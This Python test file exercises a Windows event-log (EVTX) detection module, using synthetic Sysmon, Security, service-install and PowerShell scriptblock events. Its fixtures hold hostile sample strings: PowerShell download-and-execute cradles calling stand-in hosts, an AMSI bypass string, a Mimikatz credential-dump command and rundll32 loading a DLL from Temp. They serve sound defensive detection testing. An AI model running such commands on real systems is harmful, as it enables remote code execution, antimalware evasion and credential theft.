"""
test_evtx.py — unit + integration tests for the EVTX analyzer module.

Run:  python3 -m pytest modules/evtx/tests/test_evtx.py
  or: python3 modules/evtx/tests/test_evtx.py   (plain asserts, no pytest)

Unit tests exercise normalize/rules on synthetic data (no tools needed).
The integration test runs the real evtxexport extractor over the bundled
Sysmon UACME sample and asserts a real detection fires.
"""

import sys
import tempfile
from pathlib import Path

from spectre.modules import evtx
from spectre.modules.evtx.normalize import normalize_text

SAMPLE = Path(__file__).parent / "sample.evtx"


def _write_fixture_xml(xml_text: str, tmp_path: Path) -> str:
    p = tmp_path / "fixture.xml"
    p.write_text(xml_text)
    return str(p)

_SYSMON_BLOCK = """
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2019-08-03T12:08:13.6Z"/>
    <EventRecordID>5443</EventRecordID>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>MSEDGEWIN10</Computer>
  </System>
  <EventData>
    <Data Name="ProcessId">1234</Data>
    <Data Name="Image">C:\\Windows\\System32\\eventvwr.exe</Data>
    <Data Name="CommandLine">eventvwr.exe</Data>
    <Data Name="ParentImage">C:\\Users\\IEUser\\Desktop\\UACME.exe</Data>
    <Data Name="ParentProcessId">5336</Data>
    <Data Name="User">MSEDGEWIN10\\IEUser</Data>
  </EventData>
</Event>
"""

_RUNDLL_BLOCK = """
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2026-06-20T11:47:33Z"/>
    <EventRecordID>5093</EventRecordID>
    <Channel>Security</Channel>
    <Computer>WIN10-HR-07</Computer>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\\Windows\\System32\\rundll32.exe</Data>
    <Data Name="CommandLine">rundll32.exe C:\\Windows\\Temp\\evil.dll,Start</Data>
    <Data Name="ParentProcessName">C:\\Program Files\\...\\WINWORD.EXE</Data>
    <Data Name="NewProcessId">0x7d4</Data>
    <Data Name="SubjectUserName">jsmith</Data>
  </EventData>
</Event>
"""


def _detect(events):
    anchors = []
    for e in events:
        for rule in evtx.EVTX_MODULE.rules:
            if rule.artifact_type != e.artifact_type:
                continue
            a = rule.predicate(e)
            if a:
                anchors.append(a)
    return anchors


def test_normalize_sysmon_process_creation():
    events = normalize_text(_SYSMON_BLOCK)
    assert len(events) == 1
    e = events[0]
    assert e.artifact_type == "process_creation"
    assert e.data["image_basename"] == "eventvwr.exe"
    assert e.data["parent_basename"] == "uacme.exe"
    assert e.record_id == "5443"


def test_normalize_security_4688_maps_same_schema():
    events = normalize_text(_RUNDLL_BLOCK)
    e = events[0]
    # 4688 NewProcessName maps into the SAME image field as Sysmon Image.
    assert e.data["image_basename"] == "rundll32.exe"
    assert "evil.dll" in e.data["command_line_lower"]


def test_normalize_records_channel_stats(tmp_path):
    from spectre.modules.evtx.normalize import normalize as evtx_normalize

    # "Application" is a channel this module has no dedicated schema for at
    # all (unlike "System", which now carries 104/7045) — genuinely
    # unsupported, seen-not-parsed.
    app_block = """
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Some-App-Provider"/>
    <EventID>9999</EventID>
    <TimeCreated SystemTime="2026-06-20T11:47:33Z"/>
    <EventRecordID>99</EventRecordID>
    <Channel>Application</Channel>
    <Computer>WIN10-HR-07</Computer>
  </System>
  <EventData>
    <Data Name="param1">Some App Event</Data>
  </EventData>
</Event>
"""
    xml_text = _RUNDLL_BLOCK + app_block
    handle = {
        "path": _write_fixture_xml(xml_text, tmp_path),
        "artifact_type": "process_creation",
    }
    events = evtx_normalize(handle)
    assert events
    stats = handle["channel_stats"]
    assert stats["Security"]["parsed"] >= 1
    assert stats["Application"]["seen"] >= 1 and stats["Application"]["parsed"] == 0
    assert stats["Application"]["supported"] is False
    assert stats["Security"]["supported"] is True


def test_normalize_system_channel_is_now_supported(tmp_path):
    """104/7045 (log-cleared, service-install) both live on Channel=System —
    R3's gap. A System-channel event this module still can't parse (7036,
    service state change) stays seen-not-parsed, but the CHANNEL itself is
    now supported."""
    from spectre.modules.evtx.normalize import normalize as evtx_normalize

    svc_block = """
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Service Control Manager"/>
    <EventID>7045</EventID>
    <TimeCreated SystemTime="2026-06-20T11:47:33Z"/>
    <EventRecordID>200</EventRecordID>
    <Channel>System</Channel>
    <Computer>WIN10-HR-07</Computer>
  </System>
  <EventData>
    <Data Name="ServiceName">Updater</Data>
    <Data Name="ImagePath">C:\\Windows\\System32\\svchost.exe -k netsvcs</Data>
    <Data Name="ServiceType">user mode service</Data>
    <Data Name="StartType">auto start</Data>
    <Data Name="AccountName">LocalSystem</Data>
  </EventData>
</Event>
"""
    unparsed_block = """
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Service Control Manager Eventlog Provider"/>
    <EventID>7036</EventID>
    <TimeCreated SystemTime="2026-06-20T11:48:00Z"/>
    <EventRecordID>201</EventRecordID>
    <Channel>System</Channel>
    <Computer>WIN10-HR-07</Computer>
  </System>
  <EventData>
    <Data Name="param1">Some Service</Data>
  </EventData>
</Event>
"""
    handle = {
        "path": _write_fixture_xml(svc_block + unparsed_block, tmp_path),
        "artifact_type": "process_creation",
    }
    events = evtx_normalize(handle)
    stats = handle["channel_stats"]
    assert stats["System"]["supported"] is True
    assert stats["System"]["seen"] == 2
    assert stats["System"]["parsed"] == 1
    assert any(e.artifact_type == "evtx_service_install" for e in events)


def test_rule_uac_autoelevate_fires():
    anchors = _detect(normalize_text(_SYSMON_BLOCK))
    ids = {a.rule_id for a in anchors}
    assert "uac-autoelevate-binary" in ids


def test_rule_rundll32_from_temp_fires_on_4688():
    anchors = _detect(normalize_text(_RUNDLL_BLOCK))
    rd = [a for a in anchors if a.rule_id == "rundll32-from-temp"]
    assert len(rd) == 1
    assert rd[0].iocs["filepath"] == ["C:\\Windows\\Temp\\evil.dll"]


def test_benign_event_no_detection():
    benign = _SYSMON_BLOCK.replace("eventvwr.exe", "notepad.exe")
    anchors = _detect(normalize_text(benign))
    assert anchors == []


# ── A4-05 fix: office_spawns_shell's shared command_shells list mixes
# genuine shells (cmd.exe/powershell.exe/...) with mshta.exe (System Binary
# Proxy Execution, T1218.005 — already used elsewhere in mitre-map.yaml for
# mshta-execution) and bitsadmin.exe (BITS Jobs, T1197 — a transfer utility,
# not a command/script interpreter). All six used to be stamped T1059
# (Command and Scripting Interpreter) uniformly; only the genuine shells
# still get T1059.

def _office_event(child_basename, image=None):
    from spectre.core.base import NormEvent
    return NormEvent(
        artifact_type="process_creation", timestamp="", source_file="f",
        record_id="1",
        data={
            "parent_basename": "winword.exe",
            "image_basename": child_basename,
            "image": image or f"C:\\Windows\\System32\\{child_basename}",
        },
    )


def test_office_spawns_genuine_shell_keeps_t1059():
    from spectre.modules.evtx.rules import office_spawns_shell
    a = office_spawns_shell(_office_event("powershell.exe"))
    assert a is not None
    assert a.mitre == ["T1059"]


def test_office_spawns_mshta_maps_t1218_005_not_t1059():
    from spectre.modules.evtx.rules import office_spawns_shell
    a = office_spawns_shell(_office_event("mshta.exe"))
    assert a is not None
    assert a.mitre == ["T1218.005"]
    assert "T1059" not in a.mitre


def test_office_spawns_bitsadmin_maps_t1197_not_t1059():
    from spectre.modules.evtx.rules import office_spawns_shell
    a = office_spawns_shell(_office_event("bitsadmin.exe"))
    assert a is not None
    assert a.mitre == ["T1197"]
    assert "T1059" not in a.mitre


# ── R3 gap-fill: 1102/104 log-cleared, 7045 service-install, 4104
# scriptblock, and 4624/4625 logon aggregation ─────────────────────────

def _event_block(event_id, channel, provider="Prov", ts="2026-06-20T11:00:00Z",
                  record_id="1", host="WIN10-HR-07", data=None):
    data = data or {}
    fields = "\n".join(
        f'    <Data Name="{k}">{v}</Data>' for k, v in data.items())
    return f"""
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="{provider}"/>
    <EventID>{event_id}</EventID>
    <TimeCreated SystemTime="{ts}"/>
    <EventRecordID>{record_id}</EventRecordID>
    <Channel>{channel}</Channel>
    <Computer>{host}</Computer>
  </System>
  <EventData>
{fields}
  </EventData>
</Event>
"""


def _userdata_block(event_id, channel, provider, fields, record_id="1",
                     ts="2026-06-20T11:00:00Z", host="WIN10-HR-07"):
    """Realistic Windows schema for 1102/104: fields live under
    <UserData><LogFileCleared xmlns=...>, NOT <EventData>."""
    inner = "\n".join(f"      <{k}>{v}</{k}>" for k, v in fields.items())
    return f"""
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="{provider}" Guid="{{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}}"/>
    <EventID>{event_id}</EventID>
    <TimeCreated SystemTime="{ts}"/>
    <EventRecordID>{record_id}</EventRecordID>
    <Channel>{channel}</Channel>
    <Computer>{host}</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <UserData>
    <LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">
{inner}
    </LogFileCleared>
  </UserData>
</Event>
"""


def _clear1102(record_id="1", user="jsmith"):
    return _userdata_block(1102, "Security", "Microsoft-Windows-Eventlog", {
        "SubjectUserName": user, "SubjectDomainName": "CORP",
        "SubjectLogonId": "0x3e7"}, record_id=record_id)


def _clear104(cleared="Application", record_id="1", provider="Microsoft-Windows-Eventlog",
              channel="System"):
    return _userdata_block(104, channel, provider, {
        "SubjectUserName": "admin", "SubjectDomainName": "CORP",
        "Channel": cleared, "BackupPath": ""}, record_id=record_id)


def test_normalize_1102_maps_to_log_cleared():
    events = normalize_text(_clear1102())
    assert len(events) == 1
    e = events[0]
    assert e.artifact_type == "evtx_log_cleared"
    assert e.data["cleared_channel"] == "Security"
    assert e.data["subject_user"] == "jsmith"
    assert e.data["subject_domain"] == "CORP"


def test_normalize_104_reports_actually_cleared_channel_from_userdata():
    e = normalize_text(_clear104(cleared="Application"))[0]
    assert e.artifact_type == "evtx_log_cleared"
    assert e.data["cleared_channel"] == "Application"
    assert e.data["subject_user"] == "admin"
    assert e.data["channel"] == "System"


def test_rule_104_title_names_cleared_channel_not_system():
    from spectre.modules.evtx.rules import log_cleared
    a = log_cleared(normalize_text(_clear104(cleared="Application"))[0])
    assert a is not None and a.title.startswith("Application event log cleared")


def test_104_without_cleared_channel_is_not_assumed_system():
    from spectre.modules.evtx.rules import log_cleared
    xml = _userdata_block(104, "System", "Microsoft-Windows-Eventlog",
                          {"SubjectUserName": "admin"})
    a = log_cleared(normalize_text(xml)[0])
    assert a is not None
    assert not a.title.startswith("System event log")
    assert "unknown" in a.title


def test_application_channel_104_produces_no_log_cleared():
    from spectre.modules.evtx.rules import log_cleared
    xml = _userdata_block(104, "Application", "SomeApp", {"Channel": "x"})
    e = normalize_text(xml)[0]
    assert e.artifact_type == "evtx_event"
    assert log_cleared(e) is None
    xml2 = _clear104(channel="Application")  # right provider, wrong channel
    assert normalize_text(xml2)[0].artifact_type == "evtx_event"
    xml3 = _clear104(provider="SomeApp")  # right channel, wrong provider
    assert normalize_text(xml3)[0].artifact_type == "evtx_event"


def test_wrong_channel_guards_for_other_dedicated_events():
    for xml in (
        _event_block(1102, "System", provider="Microsoft-Windows-Eventlog"),
        _event_block(1102, "Security", provider="Other"),
        _event_block(7045, "Application", provider="Service Control Manager"),
        _event_block(7045, "System", provider="Other"),
        _event_block(4104, "Application", data={"ScriptBlockText": "iex(x)"}),
    ):
        assert normalize_text(xml)[0].artifact_type == "evtx_event"


def test_logon_events_outside_security_channel_not_aggregated():
    xml = _logon_blocks(4625, "203.0.113.9", "bob", 12, channel="Application")
    assert not [e for e in normalize_text(xml) if e.artifact_type == "evtx_4625_aggregate"]


def test_log_cleared_dedup_key_distinguishes_channel_and_event():
    from spectre.modules.evtx.rules import log_cleared
    a = log_cleared(normalize_text(_clear1102(record_id="5"))[0])
    b = log_cleared(normalize_text(_clear104(record_id="5"))[0])
    assert a.dedup_key != b.dedup_key
    assert "Security" in a.dedup_key and "1102" in a.dedup_key and "5" in a.dedup_key


def test_rule_log_cleared_fires():
    from spectre.modules.evtx.rules import log_cleared
    e = normalize_text(_clear1102())[0]
    a = log_cleared(e)
    assert a is not None
    assert a.mitre == ["T1070.001"]
    assert "jsmith" in a.title


def test_rule_log_cleared_negative_on_other_event():
    from spectre.modules.evtx.rules import log_cleared
    xml = _event_block(4634, "Security")  # unrelated logoff event
    e = normalize_text(xml)[0]
    assert e.artifact_type == "evtx_event"
    assert log_cleared(e) is None


def _service_install_event(image_path, service_name="SomeSvc", account="LocalSystem"):
    xml = _event_block(7045, "System", provider="Service Control Manager", data={
        "ServiceName": service_name,
        "ImagePath": image_path,
        "ServiceType": "user mode service",
        "StartType": "demand start",
        "AccountName": account,
    })
    return normalize_text(xml)[0]


def test_normalize_7045_maps_to_service_install():
    e = _service_install_event(r"C:\Windows\System32\svchost.exe -k netsvcs")
    assert e.artifact_type == "evtx_service_install"
    assert e.data["service_name"] == "SomeSvc"


def test_rule_suspicious_service_temp_path_fires():
    from spectre.modules.evtx.rules import suspicious_service_install
    e = _service_install_event(r"C:\Users\bob\AppData\Local\Temp\evil.exe")
    a = suspicious_service_install(e)
    assert a is not None
    assert a.mitre == ["T1543.003"]


def test_rule_suspicious_service_lolbin_fires():
    from spectre.modules.evtx.rules import suspicious_service_install
    e = _service_install_event(r'C:\Windows\System32\rundll32.exe evil.dll,Entry')
    a = suspicious_service_install(e)
    assert a is not None


def test_rule_suspicious_service_comspec_fires():
    from spectre.modules.evtx.rules import suspicious_service_install
    e = _service_install_event(r'%COMSPEC% /c whoami')
    a = suspicious_service_install(e)
    assert a is not None


def test_rule_suspicious_service_encoded_fires():
    from spectre.modules.evtx.rules import suspicious_service_install
    e = _service_install_event(
        r'C:\Windows\System32\cmd.exe /c powershell -EncodedCommand SQBFAFgA')
    a = suspicious_service_install(e)
    assert a is not None


def test_rule_suspicious_service_psexec_adds_t1569_002():
    from spectre.modules.evtx.rules import suspicious_service_install
    e = _service_install_event(
        r'C:\Windows\PSEXESVC.exe', service_name="PSEXESVC")
    a = suspicious_service_install(e)
    assert a is not None
    assert "T1569.002" in a.mitre
    assert "T1543.003" in a.mitre


def test_rule_suspicious_service_benign_install_not_flagged():
    from spectre.modules.evtx.rules import suspicious_service_install
    e = _service_install_event(
        r'C:\Program Files\Acme\AcmeAgent.exe', service_name="AcmeAgent")
    assert suspicious_service_install(e) is None


def _scriptblock_event(text, sb_id="abc-123"):
    xml = _event_block(4104, "Microsoft-Windows-PowerShell/Operational",
                        provider="Microsoft-Windows-PowerShell", data={
                            "ScriptBlockText": text,
                            "ScriptBlockId": sb_id,
                            "MessageNumber": "1", "MessageTotal": "1",
                        })
    return normalize_text(xml)[0]


def test_normalize_4104_maps_to_scriptblock():
    e = _scriptblock_event("Get-Process")
    assert e.artifact_type == "evtx_scriptblock"
    assert e.data["script_block_id"] == "abc-123"


def test_rule_scriptblock_encoded_command_fires_t1027():
    from spectre.modules.evtx.rules import scriptblock_suspicious
    e = _scriptblock_event("powershell -EncodedCommand SQBFAFgA")
    a = scriptblock_suspicious(e)
    assert a is not None
    assert "T1027" in a.mitre and "T1059.001" in a.mitre
    assert "T1105" not in a.mitre


def test_rule_scriptblock_download_cradle_fires_t1105():
    from spectre.modules.evtx.rules import scriptblock_suspicious
    e = _scriptblock_event(
        "IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')")
    a = scriptblock_suspicious(e)
    assert a is not None
    assert "T1105" in a.mitre


def test_scriptblock_iex_paren_and_pipe_forms_detected():
    from spectre.modules.evtx.rules import scriptblock_suspicious
    for txt in ("iex(New-Object Net.WebClient).DownloadString('http://x/a')",
                "(New-Object Net.WebClient).DownloadString('http://x/a')|iex",
                "(New-Object Net.WebClient).DownloadString('http://x/a') | IEX"):
        a = scriptblock_suspicious(_scriptblock_event(txt))
        assert a is not None and "T1105" in a.mitre, txt


def test_scriptblock_frombase64_alone_not_t1027():
    from spectre.modules.evtx.rules import scriptblock_suspicious
    e = _scriptblock_event("$b = [Convert]::FromBase64String($s); Set-Content x $b")
    assert scriptblock_suspicious(e) is None


def test_scriptblock_frombase64_with_execution_is_t1027():
    from spectre.modules.evtx.rules import scriptblock_suspicious
    for txt in ("iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)))",
                "$b=[Convert]::FromBase64String($s); [scriptblock]::Create($b).Invoke()",
                "$b=[Convert]::FromBase64String($s); [Reflection.Assembly]::Load($b)"):
        a = scriptblock_suspicious(_scriptblock_event(txt))
        assert a is not None and "T1027" in a.mitre, txt


def test_scriptblock_amsi_and_mimikatz_emit_only_mapped_ids():
    from spectre.modules.evtx.rules import scriptblock_suspicious
    for txt in ("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
                "Invoke-Mimikatz -DumpCreds"):
        a = scriptblock_suspicious(_scriptblock_event(txt))
        assert set(a.mitre) <= {"T1059.001", "T1027", "T1105", "T1562.001", "T1003.001"}


def test_4104_records_user_sid_from_system_security():
    xml = _event_block(4104, "Microsoft-Windows-PowerShell/Operational",
                       provider="Microsoft-Windows-PowerShell",
                       data={"ScriptBlockText": "Get-Process", "ScriptBlockId": "z"}
                       ).replace("</System>", '<Security UserID="S-1-5-21-1-2-3-1001"/></System>')
    assert normalize_text(xml)[0].data["user_sid"] == "S-1-5-21-1-2-3-1001"


def test_rule_scriptblock_iex_alone_no_download_no_t1105():
    from spectre.modules.evtx.rules import scriptblock_suspicious
    e = _scriptblock_event("IEX $someLocalVariable")
    a = scriptblock_suspicious(e)
    # IEX alone with no recognizable content is not itself suspicious here.
    assert a is None


def test_rule_scriptblock_amsi_bypass_fires():
    from spectre.modules.evtx.rules import scriptblock_suspicious
    e = _scriptblock_event("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')")
    a = scriptblock_suspicious(e)
    assert a is not None
    assert "AMSI" in a.title


def test_rule_scriptblock_mimikatz_fires():
    from spectre.modules.evtx.rules import scriptblock_suspicious
    e = _scriptblock_event("Invoke-Mimikatz -DumpCreds")
    a = scriptblock_suspicious(e)
    assert a is not None


def test_rule_scriptblock_benign_not_flagged():
    from spectre.modules.evtx.rules import scriptblock_suspicious
    e = _scriptblock_event("Get-ChildItem C:\\Reports | Sort-Object Name")
    assert scriptblock_suspicious(e) is None


def _logon_blocks(event_id, ip, account, count, start_minute=0,
                   step_seconds=60, logon_type="3", channel="Security"):
    blocks = []
    for i in range(count):
        minute, second = divmod(start_minute * 60 + i * step_seconds, 60)
        ts = f"2026-06-20T11:{minute:02d}:{second:02d}Z"
        blocks.append(_event_block(event_id, channel, data={
            "TargetUserName": account, "TargetDomainName": "CORP",
            "IpAddress": ip, "LogonType": logon_type,
        }, record_id=str(100 + i), ts=ts))
    return "".join(blocks)


def test_aggregate_bruteforce_fires_at_threshold():
    xml = _logon_blocks(4625, "203.0.113.9", "administrator", count=10)
    events = normalize_text(xml)
    agg = [e for e in events if e.artifact_type == "evtx_4625_aggregate"]
    assert len(agg) == 1
    assert agg[0].data["count"] == 10
    assert agg[0].data["source_ip"] == "203.0.113.9"
    # the raw events are still preserved (nothing dropped).
    assert len([e for e in events if e.artifact_type == "evtx_event"]) == 10


def test_bruteforce_local_sources_are_not_aggregated_as_no_source_ip():
    for ip in ("-", "127.0.0.1", "::1", ""):
        xml = _logon_blocks(4625, ip, "bob", 12)
        events = normalize_text(xml)
        assert not [e for e in events if e.artifact_type == "evtx_4625_aggregate"], ip


def test_aggregate_bruteforce_below_threshold_no_finding():
    xml = _logon_blocks(4625, "203.0.113.9", "administrator", count=5)
    events = normalize_text(xml)
    assert not [e for e in events if e.artifact_type == "evtx_4625_aggregate"]


def test_aggregate_bruteforce_outside_window_no_finding():
    """10 failures spread over >10 minutes never has a qualifying window."""
    xml = _logon_blocks(4625, "203.0.113.9", "administrator", count=10,
                         step_seconds=120)  # 2 min apart -> spans 18 min
    events = normalize_text(xml)
    assert not [e for e in events if e.artifact_type == "evtx_4625_aggregate"]


def test_rule_bruteforce_logon_fires_on_aggregate():
    from spectre.modules.evtx.rules import bruteforce_logon
    xml = _logon_blocks(4625, "203.0.113.9", "administrator", count=10)
    agg = [e for e in normalize_text(xml) if e.artifact_type == "evtx_4625_aggregate"][0]
    a = bruteforce_logon(agg)
    assert a is not None
    assert a.mitre == ["T1110"]
    assert "203.0.113.9" in a.title


def test_aggregate_rdp_remote_logon_fires():
    xml = _logon_blocks(4624, "198.51.100.7", "jsmith", count=2, logon_type="10")
    events = normalize_text(xml)
    agg = [e for e in events if e.artifact_type == "evtx_4624_rdp_aggregate"]
    assert len(agg) == 1
    assert agg[0].data["count"] == 2
    assert agg[0].data["account"] == "jsmith"


def test_aggregate_rdp_local_source_not_flagged():
    xml = _logon_blocks(4624, "127.0.0.1", "jsmith", count=1, logon_type="10")
    events = normalize_text(xml)
    assert not [e for e in events if e.artifact_type == "evtx_4624_rdp_aggregate"]


def test_aggregate_rdp_ignores_logon_type_3():
    """Type 3 (Network) fan-out is explicitly out of scope for a
    single-host EVTX log — see rdp_remote_logon()'s docstring."""
    xml = _logon_blocks(4624, "198.51.100.7", "jsmith", count=5, logon_type="3")
    events = normalize_text(xml)
    assert not [e for e in events if e.artifact_type == "evtx_4624_rdp_aggregate"]


def test_rule_rdp_remote_logon_fires_on_aggregate():
    from spectre.modules.evtx.rules import rdp_remote_logon
    xml = _logon_blocks(4624, "198.51.100.7", "jsmith", count=1, logon_type="10")
    agg = [e for e in normalize_text(xml) if e.artifact_type == "evtx_4624_rdp_aggregate"][0]
    a = rdp_remote_logon(agg)
    assert a is not None
    assert a.mitre == ["T1021.001"]


def test_logon_aggregation_is_deterministic_across_runs():
    """Same input, run twice -> byte-identical aggregate output (dedup_key,
    title, count, first/last timestamps) — guards the same defect class as
    R3-01/R3-02 (frozenset-order jitter), here for dict-keyed grouping."""
    xml = (_logon_blocks(4625, "203.0.113.9", "administrator", count=10)
           + _logon_blocks(4625, "198.51.100.20", "root", count=12)
           + _logon_blocks(4624, "198.51.100.7", "jsmith", count=3, logon_type="10"))

    def _fingerprint():
        events = normalize_text(xml)
        aggs = [e for e in events
                if e.artifact_type in ("evtx_4625_aggregate", "evtx_4624_rdp_aggregate")]
        return [(e.artifact_type, e.data) for e in aggs]

    first_run = _fingerprint()
    for _ in range(5):
        assert _fingerprint() == first_run


def test_channel_stats_do_not_mark_4624_4625_as_parsed():
    """4624/4625 feed the aggregate pass but have no 1:1 per-event schema of
    their own — see normalize_text_with_stats' docstring."""
    from spectre.modules.evtx.normalize import normalize_text_with_stats
    xml = _logon_blocks(4625, "203.0.113.9", "administrator", count=3)
    events, stats = normalize_text_with_stats(xml)
    assert stats["Security"]["seen"] == 3
    assert stats["Security"]["parsed"] == 0
    assert len([e for e in events if e.artifact_type == "evtx_event"]) == 3


def test_integration_real_evtxexport():
    """Real extraction over the bundled sample must produce real events
    and at least one real detection — proving no fixture is involved."""
    if not SAMPLE.exists():
        print("SKIP integration: sample.evtx missing")
        return
    with tempfile.TemporaryDirectory() as td:
        (Path(td) / "raw_extract").mkdir()
        (Path(td) / "audit.jsonl").touch()
        handles = evtx.EVTX_MODULE.extract(td, str(SAMPLE))
        assert handles and handles[0]["result"] == "success"
        events = []
        for h in handles:
            events += evtx.EVTX_MODULE.normalize(h)
        assert len(events) >= 10
        pc = [e for e in events if e.artifact_type == "process_creation"]
        assert pc, "expected process_creation events from real sample"
        anchors = _detect(events)
        assert any(a.rule_id == "uac-autoelevate-binary" for a in anchors), \
            "expected UACME UAC-bypass detection on real sample"


if __name__ == "__main__":
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    failed = 0
    for t in tests:
        try:
            t()
            print(f"  PASS {t.__name__}")
        except AssertionError as e:
            failed += 1
            print(f"  FAIL {t.__name__}: {e}")
    print(f"\n{len(tests) - failed}/{len(tests)} passed")
    sys.exit(1 if failed else 0)


def test_scriptblock_amsi_bypass_emits_t1562_001():
    from spectre.modules.evtx.rules import scriptblock_suspicious
    a = scriptblock_suspicious(_scriptblock_event(
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"))
    assert a is not None and "T1562.001" in a.mitre
    assert "T1003.001" not in a.mitre


def test_scriptblock_mimikatz_emits_t1003_001():
    from spectre.modules.evtx.rules import scriptblock_suspicious
    a = scriptblock_suspicious(_scriptblock_event("Invoke-Mimikatz -DumpCreds"))
    assert a is not None and "T1003.001" in a.mitre
    assert "T1562.001" not in a.mitre


def test_scriptblock_benign_and_plain_encoded_omit_new_techniques():
    from spectre.modules.evtx.rules import scriptblock_suspicious
    a = scriptblock_suspicious(_scriptblock_event("powershell -EncodedCommand SQBFAFgA"))
    assert a is not None
    assert "T1562.001" not in a.mitre and "T1003.001" not in a.mitre
    assert scriptblock_suspicious(_scriptblock_event("Get-Process")) is None


def test_scriptblock_new_techniques_in_allowed_and_tables():
    import yaml
    from spectre.config import MITRE_MAP_PATH
    k = MITRE_MAP_PATH.parent / "mitre_techniques.yaml"
    d = yaml.safe_load(k.read_text())
    allowed = yaml.safe_load(MITRE_MAP_PATH.read_text())["rules"][
        "evtx-scriptblock-suspicious"]["allowed"]
    for t in ("T1562.001", "T1003.001"):
        assert t in allowed and t in d["techniques"] and t in d["tactics"]
